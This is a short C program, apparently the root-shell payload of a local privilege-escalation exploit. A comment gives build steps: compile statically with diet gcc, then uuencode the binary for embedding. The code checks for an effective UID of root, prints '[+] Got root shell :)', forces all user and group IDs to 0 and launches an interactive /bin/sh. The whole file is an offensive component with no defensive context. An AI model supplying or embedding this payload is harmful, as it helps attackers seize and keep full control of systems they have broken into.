#include <stdio.h>
#include <unistd.h>

// diet gcc shell.c -o shell -static -D_GNU_SOURCE && uuencode shell shell
int main(int argc, char *argv[]) {
	if (geteuid()) {
		printf("FAIL\n");
		return -1;			
	}

	printf("[+] Got root shell :)\n");
	char *cmd = "/bin/sh";
	char *args[] = {cmd, "-i", NULL};
	setresuid(0, 0, 0);
	setresgid(0, 0, 0);
 	execve(cmd, args, NULL);

	return 0;
}
